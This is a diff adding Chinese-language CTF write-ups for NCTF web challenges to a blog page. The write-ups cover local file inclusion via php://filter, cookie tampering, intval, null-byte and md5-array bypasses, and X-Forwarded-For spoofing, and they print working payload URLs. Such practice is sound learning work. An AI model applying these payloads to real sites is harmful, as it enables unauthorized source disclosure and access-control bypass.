@@ -168,6 +168,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <a id="more"></a>
+
 <h1 id="nctf"><a href="#nctf" class="headerlink" title="nctf"></a>nctf</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>查看源码即可看到flag</p>
 <h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>一道简单的md5漏洞题目</p>
 <p><strong>md5函数漏洞</strong></p>
@@ -193,6 +194,51 @@
 <p>点击发现url改变，跳转到了另一个页面</p>
 <p>bp抓包试试，go一下，相应包中出现flag</p>
 <p><img src="/2020/08/29/nctf/E:%5Cmyblog%5Cszyblog%5Csource_posts%5Cnctf%5Cds1.png" alt></p>
+<h2 id="phpencode"><a href="#phpencode" class="headerlink" title="phpencode"></a>phpencode</h2><p>一开始以为是解码，结果发现代码逻辑不对，直接运行php代码，出错</p>
+<p>将最后的<code>eval</code>改为<code>echo</code>,提交运行即可</p>
+<img src="/2020/08/29/nctf/myblog\szyblog\source\_posts\nctf\eval.png" style="zoom:80%;">
+
+<p><img src="/2020/08/29/nctf/E:%5Cmyblog%5Cszyblog%5Csource_posts%5Cnctf%5Cecho.png" alt></p>
+<p><img src="/2020/08/29/nctf/E:%5Cmyblog%5Cszyblog%5Csource_posts%5Cnctf%5Cphpencode.png" alt></p>
+<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p> <strong>黑盒判断方法：<br>单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。</strong> </p>
+<p> 根据<strong>PHP伪协议</strong>尝试构造如下<strong>Payload：</strong><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code>，将<strong>index.php</strong>的源码经过<strong>Base64编码</strong>输出 </p>
+<p><code>PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=</code></p>
+<p>base64解码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;&#x2F;title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;</span><br><span class="line">	$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">		echo &quot;Oh no!&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	include($file); </span><br><span class="line">&#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h2><p>与单身二十年一样，抓包即可</p>
+<p><img src="/2020/08/29/nctf/E:%5Cmyblog%5Cszyblog%5Csource_posts%5Cnctf%5Cds2.png" alt></p>
+<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p> <strong>Cookie，有时也用其复数形式 <a href="https://baike.baidu.com/item/Cookies/187064" target="_blank" rel="noopener">Cookies</a>。类型为“</strong>小型文本文件<strong>”，是某些网站为了辨别用户身份，进行<a href="https://baike.baidu.com/item/Session/479100" target="_blank" rel="noopener">Session</a>跟踪而储存在用户本地终端上的数据（通常经过加密），由用户<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>计算机暂时或永久保存的信息 。</strong></p>
+<p> <strong>TIP: 0==not</strong> </p>
+<p>bp抓包，将<code>cookie:login = 0</code>改<code>cookie:login=1</code> go</p>
+<p><img src="/2020/08/29/nctf/E:%5Cmyblog%5Cszyblog%5Csource_posts%5Cnctf%5Ccookie.png" alt></p>
+<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>进入题目，提示robots协议</p>
+<p><strong>robots协议也叫robots.txt（统一小写）是一种存放于<a href="https://baike.baidu.com/item/网站" target="_blank" rel="noopener">网站</a>根目录下的<a href="https://baike.baidu.com/item/ASCII" target="_blank" rel="noopener">ASCII</a>编码的<a href="https://baike.baidu.com/item/文本文件" target="_blank" rel="noopener">文本文件</a>，它通常告诉网络<a href="https://baike.baidu.com/item/搜索引擎" target="_blank" rel="noopener">搜索引擎</a>的漫游器（又称<a href="https://baike.baidu.com/item/网络蜘蛛" target="_blank" rel="noopener">网络蜘蛛</a>），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots<a href="https://baike.baidu.com/item/元数据" target="_blank" rel="noopener">元数据</a>（Metadata，又称元数据）。</strong></p>
+<p><strong>robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</strong></p>
+<p>查看robots.txt</p>
+<p>url:<code>http://chinalover.sinaapp.com/web11/robots.txt</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TIP:sql.php</span><br><span class="line">&#x2F;&#x2F;这里提示sql.php的源码如下</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id = intval($_GET[id]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));</span><br><span class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>大致意思：get方式传递一个id的参数,创建一个新的参数id存放取整后的值（intval()函数将参数变为整形）</p>
+<p>之后将新的$id带入sql语句中查询。if语句中说明，get方式传递的值不能为1024。</p>
+<p> <a href="http://chinalover.sinaapp.com/web11/sql.php?id=10" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web11/sql.php?id=10</a> 尝试id=10，无结果</p>
+<p>id=1024出现 no! try again，说明只有id=1024的时候才会执行if语句</p>
+<p>想到了intval()函数的作用，尝试id=1024.1</p>
+<h2 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h2><p>宽字节注入，之前写过。</p>
+<h2 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">       <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">           <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>试了试<code>?nctf[]=1</code>,出现了报错但是答案真就出来了</p>
+<p>正儿八经的做法是<code>?nctf=1%00%23biubiubiu</code>，简单的代码审计</p>
+<h2 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) == md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码审计，get方式传递参数a和b,二者的值不同，但是md5值不同，此处又利用md5()漏洞</p>
+<p> <strong>在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])null,md5(b[])null，md5(a[])=md5(b[])=null,这样就得到答案了。</strong> </p>
+<p>payload:</p>
+<p> <code>http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3</code> </p>
+<h2 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h2><p>bp抓包，添加<code>X-Forwarded-For=127.0.0.1</code>,发包即可</p>
+<p> <strong>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</strong> </p>
 
       
 
